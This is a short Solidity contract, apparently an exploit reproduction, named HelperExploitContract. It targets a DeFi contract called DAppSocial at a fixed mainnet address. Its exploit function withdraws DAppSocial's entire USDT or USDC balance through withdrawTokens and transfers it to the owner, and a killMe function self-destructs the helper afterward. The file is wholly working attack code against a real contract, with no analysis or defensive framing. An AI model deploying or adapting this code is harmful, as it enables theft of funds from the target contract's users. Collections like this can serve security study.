// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

contract HelperExploitContract {
    IUSDT private constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IDAppSocial private constant DAppSocial = IDAppSocial(0x319Ec3AD98CF8b12a8BE5719FeC6E0a9bb1ad0D1);
    address payable private immutable owner;

    constructor() {
        owner = payable(msg.sender);
    }

    // 0x42c59677 exploit function
    function exploit(address token, bool withdraw) external {
        require(msg.sender == owner, "Only owner");
        if (withdraw == true) {
            if (token == address(USDT)) {
                DAppSocial.withdrawTokens(address(token), USDT.balanceOf(address(DAppSocial)));
                USDT.transfer(owner, USDT.balanceOf(address(this)));
            } else {
                DAppSocial.withdrawTokens(address(token), USDC.balanceOf(address(DAppSocial)));
                USDC.transfer(owner, USDC.balanceOf(address(this)));
            }
        } else {
            DAppSocial.lockTokens(owner, 0);
        }
    }

    function killMe() external {
        require(msg.sender == owner, "Only owner");
        selfdestruct(owner);
    }
}
